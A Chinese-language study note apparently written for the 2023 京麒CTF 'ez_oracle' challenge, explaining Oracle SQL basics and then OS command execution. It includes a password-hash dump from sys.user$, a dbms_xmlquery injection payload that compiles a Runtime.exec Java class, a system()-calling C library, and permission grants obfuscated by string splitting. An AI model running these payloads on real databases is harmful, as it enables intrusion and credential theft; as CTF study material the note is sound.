Edited by 1llustrious(光辉)
## desc

在Oracle数据库中，`DESC` 是 `DESCRIBE` 的缩写，用于查看表或视图的结构（列信息）。`DESC` 命令通常用于在SQL*Plus或其他SQL界面中查看表的元数据信息。

常见表:`user_tables`,`dba_tables`,`all_tables`,`ALL_TAB_COLUMNS`,`ALL_USERS`等

```sql
SYSTEM
Admin123
```

## 信息

版本
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811675042-a00b6d97-c3d6-4e78-b95a-46eb0e819378.png#averageHue=%233a3a3a&clientId=ueb947172-4289-4&from=paste&height=166&id=u939ea190&originHeight=149&originWidth=834&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=15079&status=done&style=none&taskId=u104e0145-eea2-4cbc-ae41-3b5e45ce86d&title=&width=926.6666912149507)
```sql
SELECT * FROM v$version;
```

![](./%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231221142109616.png#id=GrrS1&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811679286-6b600775-3126-49c2-8ad4-e6c0ab18b5da.png#averageHue=%23101010&clientId=ueb947172-4289-4&from=paste&height=131&id=uf3b1693a&originHeight=118&originWidth=812&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=4607&status=done&style=none&taskId=u27b9f224-cd89-4c9f-9ac1-61736b1ad6e&title=&width=902.2222461229495)

数据库名称

```sql
SELECT * FROM global_name;
```

![](./%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231221142159394.png#id=peopq&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

获取表

```sql
SELECT table_name
FROM all_tables
```

获取用户

```sql
SELECT username
FROM dba_users;
```

获取哈希

```sql
SELECT name, password, astatus FROM sys.user$;
```

## 增删改查

和mysql之类的差不多

## 其它特性

使用`concat`或||拼接字符串,`''`表示字符串,`""`表示变量

## java source

在 Oracle 数据库中，可以使用 Java 来创建和执行存储过程，这些存储过程的实现是使用 Java 编写的。这被称为 "Java Stored Procedures"。

```sql
CREATE OR REPLACE JAVA SOURCE NAMED "SampleJavaSource" AS
public class SampleJavaClass {
    public static void sampleMethod() {
        System.out.println("Hello from SampleJavaClass!");
    }
};
/
```

![](./%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703142737647.png#id=S3fBC&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811703625-fc782993-579d-41a8-988b-fb19686bfdfb.png#averageHue=%23121212&clientId=ueb947172-4289-4&from=paste&height=237&id=uc7746942&originHeight=213&originWidth=759&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=14141&status=done&style=none&taskId=u143ef6ae-f6aa-493e-b93f-13c4f62779c&title=&width=843.3333556740379)

```sql
select OBJECT_ID from all_objects where object_name ='SampleJavaSource';
```

![](./%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703142953811.png#id=K8KFI&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811707712-f202d4e4-48c2-4693-873f-7b0d2079ec55.png#averageHue=%23111111&clientId=ueb947172-4289-4&from=paste&height=146&id=u7d30cae7&originHeight=131&originWidth=743&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=6375&status=done&style=none&taskId=ub01b7638-45cb-4533-a6e6-fecc14bf01b&title=&width=825.5555774253097)

有时为了防止重复导致的一些问题,有优化的写法

```sql
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED SampleJavaSource as 
// code 
/
```

```sql
DROP JAVA SOURCE "SampleJavaSource"
```

procedured

```sql
CREATE OR REPLACE PROCEDURE CallSampleMethod AS
    LANGUAGE JAVA
    NAME 'SampleJavaClass.sampleMethod()';
/
```

创建function调用一个过程

```sql
CREATE OR REPLACE FUNCTION CallSampleFunction RETURN VARCHAR2 AS
    result VARCHAR2(100);
BEGIN
    -- Call the Java stored procedure
    CallSampleMethod;

    -- Optionally, you can also call the Java method directly
    -- result := SampleJavaClass.sampleMethod();

    RETURN 'Function called successfully.';
END CallSampleFunction;
/
```

```sql
SELECT CallSampleFunction FROM dual;
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811716061-91086609-64f4-4a2e-a80b-0d7a8a6b8593.png#averageHue=%23131313&clientId=ueb947172-4289-4&from=paste&height=130&id=u28e6f59e&originHeight=117&originWidth=699&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=6200&status=done&style=none&taskId=u1ad961ab-37a4-44bc-aa9a-2cc448053ab&title=&width=776.6666872413075)
![](./%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703145157544.png#id=hjC0x&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 外部lib

```sql
#include <stdio.h>
#include <stdlib.h>
#include <exp.h>

char* cmd(char* command){
    system(cmd);
    return "1";
}
```

```sql
#ifndef exp_h_
#define exp_h_

extern char* cmd(char* command)
#endif
```

编译成so

```sql
create or replace lib as '/path/to/so';
```

```sql
create or replace function cmd(str varchar2) return varchar2 as language c library lib name "cmd";
```

随后使用select调用.

## dbms_xmlquery

[Oracle数据库提权 - micr067 - 博客园 (cnblogs.com)](https://www.cnblogs.com/micr067/p/12763325.html)

**使用 XMLType 创建 XML 对象：**

在使用 `DBMS_XMLQUERY` 之前，通常需要将 XML 文档存储为 `XMLType` 对象。可以使用 `XMLType` 构造函数或 `XMLType.createXML` 方法。

```sql
DECLARE
  xml_document XMLType := XMLType('<root><element>Value</element></root>');
  result XMLType;
BEGIN
  result := DBMS_XMLQUERY.PARSE(xml_document, '/root/element/text()');
  DBMS_OUTPUT.PUT_LINE('Result: ' || result.getStringVal());
END;
/
```

**执行 XPath 查询：**

使用 `DBMS_XMLQUERY` 包中的 `PARSE` 函数执行 XPath 查询。

```sql
DECLARE
  xml_document XMLType := XMLType('<root><element>Value</element></root>');
  result XMLType;
BEGIN
  result := DBMS_XMLQUERY.PARSE(xml_document, '/root/element/text()');
  DBMS_OUTPUT.PUT_LINE('Result: ' || result.getStringVal());
END;
/
```

```sql
DECLARE
   PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
   EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "LinxUtil" AS
                      import java.io.*;
                      public class LinxUtil extends Object {
                          public static String runCMD(String args) {
                              try {
                                  BufferedReader myReader = new BufferedReader(new InputStreamReader(
                                      Runtime.getRuntime().exec(args).getInputStream()));
                                  String stemp, str = "";
                                  while ((stemp = myReader.readLine()) != null)
                                      str += stemp + "\n";
                                  myReader.close();
                                  return str;
                              } catch (Exception e) {
                                  return e.toString();
                              }
                          }
                      }';
   COMMIT;
END;
/
```

首先Declare启动匿名PL/SQL的生命, `PRAGMA AUTONOMOUS_TRANSACTION;` 声明自治事务。自治事务允许独立于主事务提交更改。当您想要执行某些即使主事务回滚也应提交的操作时，通常使用此方法。

然后执行一段语句.

`COMMIT` 语句用于提交在自治事务中所做的更改。这确保了在数据库中永久创建和编译 Java 源代码。

先创建了一个类和方法

```python
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811733297-72984c18-cd3e-4d12-8e41-9d644f1b5ec0.png#averageHue=%231f1f1f&clientId=ueb947172-4289-4&from=paste&height=202&id=ud41b24bf&originHeight=182&originWidth=1107&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=26441&status=done&style=none&taskId=ufbdf330d-819c-4f67-a8c0-353488c6431&title=&width=1230.0000325838732)


```python
declare 
   PRAGMA AUTONOMOUS_TRANSACTION;
begin 
   execute immediate 'create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''LinxUtil.runCMD(java.lang.String) return String'';'; 
   commit; 
end;
```

两个单括号相当于对一个单括号的转义

```python
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
```

那么两个单括号里面使用四个括号就是二重转义了（）.![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811752305-d11f80bc-ae3e-4038-9f7f-1e08e25a3821.png#averageHue=%23181818&clientId=ueb947172-4289-4&from=paste&height=184&id=ue35bbed3&originHeight=166&originWidth=1102&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=16387&status=done&style=none&taskId=u5de345ff-0b66-4c1a-bf10-630827e28bb&title=&width=1224.4444768811459)查询对象是否存在

```python
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';
```

```python
select linxruncmd('whoami') from dual;
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811764501-4949d7f7-a3c3-49be-b597-48f93a6f7490.png#averageHue=%23131313&clientId=ueb947172-4289-4&from=paste&height=128&id=u6326a779&originHeight=115&originWidth=721&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=7112&status=done&style=none&taskId=u5b96dc85-565d-486d-98f8-acd96b9dc70&title=&width=801.1111323333087)成了.
大G老师如是说:DUAL 是 Oracle 数据库中的一个特殊表，它通常包含一行一列的数据。DUAL 表是一个虚拟表，不存储任何实际数据，但是它在 Oracle SQL 查询和 PL/SQL 中经常被用作一种手段。
不管咋说,查啥,都要指定这个表,算是Oracle的一个特性吧.
## 用户管理

### 一般管理

创建用户

```python
CREATE USER username IDENTIFIED BY password;
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811791068-3630c053-3665-499b-95ad-06becdf7f741.png#averageHue=%23121212&clientId=ueb947172-4289-4&from=paste&height=108&id=u10441d11&originHeight=97&originWidth=652&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=4317&status=done&style=none&taskId=ua730e04f-2751-45f3-b592-d9a56707324&title=&width=724.4444636356689)授授予角色

```python
SELECT * FROM DBA_ROLES;#查看拥有的撅色
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811809090-f2d42cc9-13f8-45ab-a6d2-75dd97070e84.png#averageHue=%23181818&clientId=ueb947172-4289-4&from=paste&height=308&id=u4e341a31&originHeight=277&originWidth=678&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=20319&status=done&style=none&taskId=u07210477-bd69-4b25-aa8b-ac4ce9e19bf&title=&width=753.333353289852)
```python
GRANT role_name TO "1llstrious";
GRANT CWM_USER TO illustrious;
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811821047-2010a691-4e6e-4f79-9298-656189fb244a.png#averageHue=%23151515&clientId=ueb947172-4289-4&from=paste&height=90&id=ud40a12ae&originHeight=81&originWidth=376&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=3943&status=done&style=none&taskId=u03fa9ab1-98a0-4c33-936f-916ed1f4ebf&title=&width=417.7777888451096)
```python
SELECT * FROM DBA_TAB_PRIVS where GRANTEE = 'SYS';
```
```python
ALTER USER illustrious ACCOUNT LOCK;
ALTER USER illustrious ACCOUNT UNLOCK;
```

锁定和解锁用户

### dbms_java.grant_permission赋权

在 Oracle 数据库中，`DBMS_JAVA.GRANT_PERMISSION` 是一个过程，用于为 Java 类或资源授予权限。这个过程通常用于在 Oracle 数据库中执行 Java 类的操作时管理 Java 安全性。

```python
DBMS_JAVA.GRANT_PERMISSION(
   grantee         IN VARCHAR2,
   permission_type IN VARCHAR2,
   permission_name IN VARCHAR2,
   permission_path IN VARCHAR2,
   permission_action IN VARCHAR2
);
```

- `grantee`: 授予权限的用户或角色的名称。
- `permission_type`: 权限的类型，通常是 `'java.io.FilePermission'` 或 `'java.lang.RuntimePermission'`。
- `permission_name`: 权限的名称，通常是文件路径（对于文件权限）或操作（对于运行时权限）。
- `permission_path`: 文件路径，仅在 `permission_type` 为 `'java.io.FilePermission'` 时使用。
- `permission_action`: 操作，仅在 `permission_type` 为 `'java.lang.RuntimePermission'` 时使用。

```python
begin
dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete');
end;
/
```

![](./%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703211934218.png#id=d65lm&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)![image.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1703811852970-c025b0f5-580a-4916-9fa8-ab0defda092b.png#averageHue=%23121212&clientId=ueb947172-4289-4&from=paste&height=138&id=uafe78a3a&originHeight=124&originWidth=1068&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=10027&status=done&style=none&taskId=u16414868-74f8-4d0d-9047-bb2638ce0f6&title=&width=1186.6666981025987)
赋予文件访问权限.

 
```python
BEGIN
   DBMS_JAVA.GRANT_PERMISSION('SYSTEM', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
END;
```

```python
begin
dbms_java.grant_permission('SYSTEM', 'SYS:java.lang.Runt'||'imePermission', 'readFileDesc'||'riptor', '');
end;
```

能够读写

其它的一些

```python
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.lang.RuntimePermission','writeFileDescriptor',NULL,'ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.lang.RuntimePermission','readFileDescriptor',NULL,'ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
```

## 一些其它的辅助语句

```python
SHOW ERRORS FUNCTION your_function_name;
```

排查创建函数时的错误

```python
SELECT OBJECT_NAME, OBJECT_TYPE
FROM ALL_OBJECTS
WHERE OBJECT_TYPE = 'FUNCTION' AND OWNER = 'system';
```

快速连接

```java
sqlplus username/password@ip:port/service_name
```


# 2023京麒ctf ez_oracle
[https://1llustrious.github.io/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/](https://1llustrious.github.io/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/)
[https://exp10it.io/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/](https://exp10it.io/2023/12/2023-%E4%BA%AC%E9%BA%92-ctf-ez_oracle-writeup/)
[https://boogipop.com/2023/12/15/Oracle](https://boogipop.com/2023/12/15/Oracle)
